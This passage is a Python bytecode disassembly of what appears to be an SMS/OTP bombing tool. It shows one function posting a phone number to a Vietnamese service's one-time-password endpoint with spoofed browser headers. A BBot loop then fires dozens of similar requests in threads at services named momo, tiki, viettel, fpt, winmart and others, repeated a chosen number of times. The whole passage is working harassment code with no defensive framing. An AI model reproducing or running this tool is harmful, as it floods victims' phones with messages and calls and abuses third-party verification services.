
 988          38 LOAD_CONST              17 ('cors')

 989          40 LOAD_CONST              18 ('same-site')

 990          42 LOAD_CONST              19 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36')

 976          44 LOAD_CONST              20 (('authority', 'accept', 'accept-language', 'content-type', 'origin', 'referer', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site', 'user-agent'))
              46 BUILD_CONST_KEY_MAP     13
              48 STORE_FAST               2 (headers)

 994          50 LOAD_CONST              21 ('phone')
              52 LOAD_FAST                0 (phone)

 993          54 BUILD_MAP                1
              56 STORE_FAST               3 (json_data)

 997          58 LOAD_GLOBAL              1 (NULL + requests)
              70 LOAD_ATTR                1 (post)

 998          80 LOAD_CONST              22 ('https://api.dongplus.vn/api/user/send-one-time-password')

 999          82 LOAD_FAST                1 (cookies)

1000          84 LOAD_FAST                2 (headers)

1001          86 LOAD_FAST                3 (json_data)

 997          88 KW_NAMES                23
              90 PRECALL                  4
              94 CALL                     4
             104 STORE_FAST               4 (response)
             106 LOAD_CONST               0 (None)
             108 RETURN_VALUE

Disassembly of <code object sendmm at 0x7f48c6e11790, file "<x>", line 1008>:
1008           0 RESUME                   0

1009           2 NOP

1010     >>    4 LOAD_GLOBAL              1 (NULL + momo)
              16 LOAD_GLOBAL              2 (phone)
              28 PRECALL                  1
              32 CALL                     1
              42 POP_TOP

1011          44 LOAD_GLOBAL              5 (NULL + time)
              56 LOAD_ATTR                3 (sleep)
              66 LOAD_CONST               2 (1)
              68 PRECALL                  1
              72 CALL                     1
              82 POP_TOP

1012          84 LOAD_GLOBAL              9 (NULL + range)
              96 LOAD_GLOBAL             10 (amount)
             108 PRECALL                  1
             112 CALL                     1
             122 GET_ITER
         >>  124 FOR_ITER                16 (to 158)
             126 STORE_FAST               0 (b)

1013         128 LOAD_GLOBAL             13 (NULL + exit)
             140 PRECALL                  0
             144 CALL                     0
             154 POP_TOP
             156 JUMP_BACKWARD           17 (to 124)

1009     >>  158 JUMP_BACKWARD           78 (to 4)

Disassembly of <code object sendcall1 at 0x7f48c6df1bc0, file "<x>", line 1014>:
1014           0 RESUME                   0

1015           2 NOP

1016     >>    4 LOAD_GLOBAL              1 (NULL + call1)
              16 LOAD_FAST                0 (phone)
              18 PRECALL                  1
              22 CALL                     1
              32 POP_TOP

1017          34 LOAD_GLOBAL              3 (NULL + time)
              46 LOAD_ATTR                2 (sleep)
              56 LOAD_CONST               2 (1)
              58 PRECALL                  1
              62 CALL                     1
              72 POP_TOP

1018          74 LOAD_GLOBAL              7 (NULL + range)
              86 LOAD_GLOBAL              8 (amount)
              98 PRECALL                  1
             102 CALL                     1
             112 GET_ITER
         >>  114 FOR_ITER                16 (to 148)
             116 STORE_FAST               1 (b)

1019         118 LOAD_GLOBAL             11 (NULL + exit)
             130 PRECALL                  0
             134 CALL                     0
             144 POP_TOP
             146 JUMP_BACKWARD           17 (to 114)

1015     >>  148 JUMP_BACKWARD           73 (to 4)

Disassembly of <code object BBot at 0x1281830, file "<x>", line 1020>:
1020           0 RESUME                   0

1021           2 LOAD_GLOBAL              1 (NULL + range)
              14 LOAD_FAST                1 (amount)
              16 PRECALL                  1
              20 CALL                     1
              30 GET_ITER
         >>   32 EXTENDED_ARG             5
              34 FOR_ITER              1430 (to 2896)
              36 STORE_FAST               2 (i)

1022          38 LOAD_GLOBAL              3 (NULL + threading)
              50 LOAD_ATTR                2 (submit)
              60 LOAD_GLOBAL              6 (sendmm)
              72 PRECALL                  1
              76 CALL                     1
              86 POP_TOP

1023          88 LOAD_GLOBAL              9 (NULL + time)
             100 LOAD_ATTR                5 (sleep)
             110 LOAD_CONST               1 (1)
             112 PRECALL                  1
             116 CALL                     1
             126 POP_TOP

1024         128 LOAD_GLOBAL              3 (NULL + threading)
             140 LOAD_ATTR                2 (submit)
             150 LOAD_GLOBAL             12 (tobi)
             162 LOAD_FAST                0 (phone)
             164 PRECALL                  2
             168 CALL                     2
             178 POP_TOP

1025         180 LOAD_GLOBAL              3 (NULL + threading)
             192 LOAD_ATTR                2 (submit)
             202 LOAD_GLOBAL             14 (apiv5)
             214 LOAD_FAST                0 (phone)
             216 PRECALL                  2
             220 CALL                     2
             230 POP_TOP

1026         232 LOAD_GLOBAL              3 (NULL + threading)
             244 LOAD_ATTR                2 (submit)
             254 LOAD_GLOBAL             16 (poy)
             266 LOAD_FAST                0 (phone)
             268 PRECALL                  2
             272 CALL                     2
             282 POP_TOP

1027         284 LOAD_GLOBAL              3 (NULL + threading)
             296 LOAD_ATTR                2 (submit)
             306 LOAD_GLOBAL             18 (sendcall1)
             318 LOAD_FAST                0 (phone)
             320 PRECALL                  2
             324 CALL                     2
             334 POP_TOP

1028         336 LOAD_GLOBAL              9 (NULL + time)
             348 LOAD_ATTR                5 (sleep)
             358 LOAD_CONST               1 (1)
             360 PRECALL                  1
             364 CALL                     1
             374 POP_TOP

1029         376 LOAD_GLOBAL              3 (NULL + threading)
             388 LOAD_ATTR                2 (submit)
             398 LOAD_GLOBAL             20 (call2)
             410 LOAD_FAST                0 (phone)
             412 PRECALL                  2
             416 CALL                     2
             426 POP_TOP

1030         428 LOAD_GLOBAL              9 (NULL + time)
             440 LOAD_ATTR                5 (sleep)
             450 LOAD_CONST               1 (1)
             452 PRECALL                  1
             456 CALL                     1
             466 POP_TOP

1031         468 LOAD_GLOBAL              3 (NULL + threading)
             480 LOAD_ATTR                2 (submit)
             490 LOAD_GLOBAL             22 (call3)
             502 LOAD_FAST                0 (phone)
             504 PRECALL                  2
             508 CALL                     2
             518 POP_TOP

1032         520 LOAD_GLOBAL              9 (NULL + time)
             532 LOAD_ATTR                5 (sleep)
             542 LOAD_CONST               1 (1)
             544 PRECALL                  1
             548 CALL                     1
             558 POP_TOP

1033         560 LOAD_GLOBAL              3 (NULL + threading)
             572 LOAD_ATTR                2 (submit)
             582 LOAD_GLOBAL             24 (call4)
             594 LOAD_FAST                0 (phone)
             596 PRECALL                  2
             600 CALL                     2
             610 POP_TOP

1034         612 LOAD_GLOBAL              9 (NULL + time)
             624 LOAD_ATTR                5 (sleep)
             634 LOAD_CONST               1 (1)
             636 PRECALL                  1
             640 CALL                     1
             650 POP_TOP

1035         652 LOAD_GLOBAL              3 (NULL + threading)
             664 LOAD_ATTR                2 (submit)
             674 LOAD_GLOBAL             26 (call5)
             686 LOAD_FAST                0 (phone)
             688 PRECALL                  2
             692 CALL                     2
             702 POP_TOP

1036         704 LOAD_GLOBAL              9 (NULL + time)
             716 LOAD_ATTR                5 (sleep)
             726 LOAD_CONST               1 (1)
             728 PRECALL                  1
             732 CALL                     1
             742 POP_TOP

1037         744 LOAD_GLOBAL              3 (NULL + threading)
             756 LOAD_ATTR                2 (submit)
             766 LOAD_GLOBAL             28 (callv10)
             778 LOAD_FAST                0 (phone)
             780 PRECALL                  2
             784 CALL                     2
             794 POP_TOP

1038         796 LOAD_GLOBAL              3 (NULL + threading)
             808 LOAD_ATTR                2 (submit)
             818 LOAD_GLOBAL             30 (moca)
             830 LOAD_FAST                0 (phone)
             832 PRECALL                  2
             836 CALL                     2
             846 POP_TOP

1039         848 LOAD_GLOBAL              3 (NULL + threading)
             860 LOAD_ATTR                2 (submit)
             870 LOAD_GLOBAL             32 (minh)
             882 LOAD_FAST                0 (phone)
             884 PRECALL                  2
             888 CALL                     2
             898 POP_TOP

1040         900 LOAD_GLOBAL              3 (NULL + threading)
             912 LOAD_ATTR                2 (submit)
             922 LOAD_GLOBAL             34 (pop)
             934 LOAD_FAST                0 (phone)
             936 PRECALL                  2
             940 CALL                     2
             950 POP_TOP

1041         952 LOAD_GLOBAL              3 (NULL + threading)
             964 LOAD_ATTR                2 (submit)
             974 LOAD_GLOBAL             36 (winmart)
             986 LOAD_FAST                0 (phone)
             988 PRECALL                  2
             992 CALL                     2
            1002 POP_TOP

1042        1004 LOAD_GLOBAL              3 (NULL + threading)
            1016 LOAD_ATTR                2 (submit)
            1026 LOAD_GLOBAL             38 (apiv2)
            1038 LOAD_FAST                0 (phone)
            1040 PRECALL                  2
            1044 CALL                     2
            1054 POP_TOP

1043        1056 LOAD_GLOBAL              3 (NULL + threading)
            1068 LOAD_ATTR                2 (submit)
            1078 LOAD_GLOBAL             40 (concung)
            1090 LOAD_FAST                0 (phone)
            1092 PRECALL                  2
            1096 CALL                     2
            1106 POP_TOP

1044        1108 LOAD_GLOBAL              3 (NULL + threading)
            1120 LOAD_ATTR                2 (submit)
            1130 LOAD_GLOBAL             42 (daihocfpt)
            1142 LOAD_FAST                0 (phone)
            1144 PRECALL                  2
            1148 CALL                     2
            1158 POP_TOP

1045        1160 LOAD_GLOBAL              3 (NULL + threading)
            1172 LOAD_ATTR                2 (submit)
            1182 LOAD_GLOBAL             44 (cafeland)
            1194 LOAD_FAST                0 (phone)
            1196 PRECALL                  2
            1200 CALL                     2
            1210 POP_TOP

1046        1212 LOAD_GLOBAL              3 (NULL + threading)
            1224 LOAD_ATTR                2 (submit)
            1234 LOAD_GLOBAL             46 (moneydong)
            1246 LOAD_FAST                0 (phone)
            1248 PRECALL                  2
            1252 CALL                     2
            1262 POP_TOP

1047        1264 LOAD_GLOBAL              3 (NULL + threading)
            1276 LOAD_ATTR                2 (submit)
            1286 LOAD_GLOBAL             48 (gotadi)
            1298 LOAD_FAST                0 (phone)
            1300 PRECALL                  2
            1304 CALL                     2
            1314 POP_TOP

1048        1316 LOAD_GLOBAL              3 (NULL + threading)
            1328 LOAD_ATTR                2 (submit)
            1338 LOAD_GLOBAL             50 (call9)
            1350 LOAD_FAST                0 (phone)
            1352 PRECALL                  2
            1356 CALL                     2
            1366 POP_TOP

1049        1368 LOAD_GLOBAL              9 (NULL + time)
            1380 LOAD_ATTR                5 (sleep)
            1390 LOAD_CONST               1 (1)
            1392 PRECALL                  1
            1396 CALL                     1
            1406 POP_TOP

1050        1408 LOAD_GLOBAL              3 (NULL + threading)
            1420 LOAD_ATTR                2 (submit)
            1430 LOAD_GLOBAL             52 (funring)
            1442 LOAD_FAST                0 (phone)
            1444 PRECALL                  2
            1448 CALL                     2
            1458 POP_TOP

1051        1460 LOAD_GLOBAL              3 (NULL + threading)
            1472 LOAD_ATTR                2 (submit)
            1482 LOAD_GLOBAL             54 (fptplay)
            1494 LOAD_FAST                0 (phone)
            1496 PRECALL                  2
            1500 CALL                     2
            1510 POP_TOP

1052        1512 LOAD_GLOBAL              3 (NULL + threading)
            1524 LOAD_ATTR                2 (submit)
            1534 LOAD_GLOBAL             56 (vietid)
            1546 LOAD_FAST                0 (phone)
            1548 PRECALL                  2
            1552 CALL                     2
            1562 POP_TOP

1053        1564 LOAD_GLOBAL              3 (NULL + threading)
            1576 LOAD_ATTR                2 (submit)
            1586 LOAD_GLOBAL             58 (ahamove)
            1598 LOAD_FAST                0 (phone)
            1600 PRECALL                  2
            1604 CALL                     2
            1614 POP_TOP

1054        1616 LOAD_GLOBAL              3 (NULL + threading)
            1628 LOAD_ATTR                2 (submit)
            1638 LOAD_GLOBAL             60 (vieon1)
            1650 LOAD_FAST                0 (phone)
            1652 PRECALL                  2
            1656 CALL                     2
            1666 POP_TOP

1055        1668 LOAD_GLOBAL              3 (NULL + threading)
            1680 LOAD_ATTR                2 (submit)
            1690 LOAD_GLOBAL             62 (apiv3)
            1702 LOAD_FAST                0 (phone)
            1704 PRECALL                  2
            1708 CALL                     2
            1718 POP_TOP

1056        1720 LOAD_GLOBAL              3 (NULL + threading)
            1732 LOAD_ATTR                2 (submit)
            1742 LOAD_GLOBAL             64 (oldloship)
            1754 LOAD_FAST                0 (phone)
            1756 PRECALL                  2
            1760 CALL                     2
            1770 POP_TOP

1057        1772 LOAD_GLOBAL              3 (NULL + threading)
            1784 LOAD_ATTR                2 (submit)
            1794 LOAD_GLOBAL             66 (callv11)
            1806 LOAD_FAST                0 (phone)
            1808 PRECALL                  2
            1812 CALL                     2
            1822 POP_TOP

1058        1824 LOAD_GLOBAL              3 (NULL + threading)
            1836 LOAD_ATTR                2 (submit)
            1846 LOAD_GLOBAL             68 (kiot)
            1858 LOAD_FAST                0 (phone)
            1860 PRECALL                  2
            1864 CALL                     2
            1874 POP_TOP

1059        1876 LOAD_GLOBAL              3 (NULL + threading)
            1888 LOAD_ATTR                2 (submit)
            1898 LOAD_GLOBAL             70 (tv360)
            1910 LOAD_FAST                0 (phone)
            1912 PRECALL                  2
            1916 CALL                     2
            1926 POP_TOP

1060        1928 LOAD_GLOBAL              3 (NULL + threading)
            1940 LOAD_ATTR                2 (submit)
            1950 LOAD_GLOBAL             72 (vntrip)
            1962 LOAD_FAST                0 (phone)
            1964 PRECALL                  2
            1968 CALL                     2
            1978 POP_TOP

1061        1980 LOAD_GLOBAL              3 (NULL + threading)
            1992 LOAD_ATTR                2 (submit)
            2002 LOAD_GLOBAL             74 (meta)
            2014 LOAD_FAST                0 (phone)
            2016 PRECALL                  2
            2020 CALL                     2
            2030 POP_TOP

1062        2032 LOAD_GLOBAL              3 (NULL + threading)
            2044 LOAD_ATTR                2 (submit)
            2054 LOAD_GLOBAL             76 (call10)
            2066 LOAD_FAST                0 (phone)
            2068 PRECALL                  2
            2072 CALL                     2
            2082 POP_TOP

1063        2084 LOAD_GLOBAL              9 (NULL + time)
            2096 LOAD_ATTR                5 (sleep)
            2106 LOAD_CONST               1 (1)
            2108 PRECALL                  1
            2112 CALL                     1
            2122 POP_TOP

1064        2124 LOAD_GLOBAL              3 (NULL + threading)
            2136 LOAD_ATTR                2 (submit)
            2146 LOAD_GLOBAL             78 (vieon)
            2158 LOAD_FAST                0 (phone)
            2160 PRECALL                  2
            2164 CALL                     2
            2174 POP_TOP

1065        2176 LOAD_GLOBAL              3 (NULL + threading)
            2188 LOAD_ATTR                2 (submit)
            2198 LOAD_GLOBAL             80 (alfres)
            2210 LOAD_FAST                0 (phone)
            2212 PRECALL                  2
            2216 CALL                     2
            2226 POP_TOP

1066        2228 LOAD_GLOBAL              3 (NULL + threading)
            2240 LOAD_ATTR                2 (submit)
            2250 LOAD_GLOBAL             82 (loship)
            2262 LOAD_FAST                0 (phone)
            2264 PRECALL                  2
            2268 CALL                     2
            2278 POP_TOP

1067        2280 LOAD_GLOBAL              3 (NULL + threading)
            2292 LOAD_ATTR                2 (submit)
            2302 LOAD_GLOBAL             84 (tiki)
            2314 LOAD_FAST                0 (phone)
            2316 PRECALL                  2
            2320 CALL                     2
            2330 POP_TOP

1068        2332 LOAD_GLOBAL              3 (NULL + threading)
            2344 LOAD_ATTR                2 (submit)
            2354 LOAD_GLOBAL             86 (f88)
            2366 LOAD_FAST                0 (phone)
            2368 PRECALL                  2
            2372 CALL                     2
            2382 POP_TOP

1069        2384 LOAD_GLOBAL              3 (NULL + threading)
            2396 LOAD_ATTR                2 (submit)
            2406 LOAD_GLOBAL             88 (fb)
            2418 LOAD_FAST                0 (phone)
            2420 PRECALL                  2
            2424 CALL                     2
            2434 POP_TOP

1070        2436 LOAD_GLOBAL              3 (NULL + threading)
            2448 LOAD_ATTR                2 (submit)
            2458 LOAD_GLOBAL             90 (callv12)
            2470 LOAD_FAST                0 (phone)
            2472 PRECALL                  2
            2476 CALL                     2
            2486 POP_TOP

1071        2488 LOAD_GLOBAL              3 (NULL + threading)
            2500 LOAD_ATTR                2 (submit)
            2510 LOAD_GLOBAL             92 (fpt)
            2522 LOAD_FAST                0 (phone)
            2524 PRECALL                  2
            2528 CALL                     2
            2538 POP_TOP

1072        2540 LOAD_GLOBAL              3 (NULL + threading)
            2552 LOAD_ATTR                2 (submit)
            2562 LOAD_GLOBAL             94 (gbay)
            2574 LOAD_FAST                0 (phone)
            2576 PRECALL                  2
            2580 CALL                     2
            2590 POP_TOP

1073        2592 LOAD_GLOBAL              3 (NULL + threading)
            2604 LOAD_ATTR                2 (submit)
            2614 LOAD_GLOBAL             96 (zlpay)
            2626 LOAD_FAST                0 (phone)
            2628 PRECALL                  2
            2632 CALL                     2
            2642 POP_TOP

1074        2644 LOAD_GLOBAL              3 (NULL + threading)
            2656 LOAD_ATTR                2 (submit)
            2666 LOAD_GLOBAL             98 (viettel)
            2678 LOAD_FAST                0 (phone)
            2680 PRECALL                  2
            2684 CALL                     2
            2694 POP_TOP

1075        2696 LOAD_GLOBAL              3 (NULL + threading)
            2708 LOAD_ATTR                2 (submit)
            2718 LOAD_GLOBAL            100 (dkvt)
            2730 LOAD_FAST                0 (phone)
            2732 PRECALL                  2
            2736 CALL                     2
            2746 POP_TOP

1076        2748 LOAD_GLOBAL              3 (NULL + threading)
            2760 LOAD_ATTR                2 (submit)
            2770 LOAD_GLOBAL            102 (call11)
            2782 LOAD_FAST                0 (phone)
            2784 PRECALL                  2
            2788 CALL                     2
            2798 POP_TOP

1077        2800 LOAD_GLOBAL              9 (NULL + time)
            2812 LOAD_ATTR                5 (sleep)
            2822 LOAD_CONST               1 (1)
            2824 PRECALL                  1
            2828 CALL                     1
            2838 POP_TOP

1078        2840 LOAD_GLOBAL              3 (NULL + threading)
            2852 LOAD_ATTR                2 (submit)
            2862 LOAD_GLOBAL            104 (tgdd)
            2874 LOAD_FAST                0 (phone)
            2876 PRECALL                  2
            2880 CALL                     2
            2890 POP_TOP
            2892 EXTENDED_ARG             5
            2894 JUMP_BACKWARD         1432 (to 32)

1021     >> 2896 LOAD_CONST               0 (None)
            2898 RETURN_VALUE
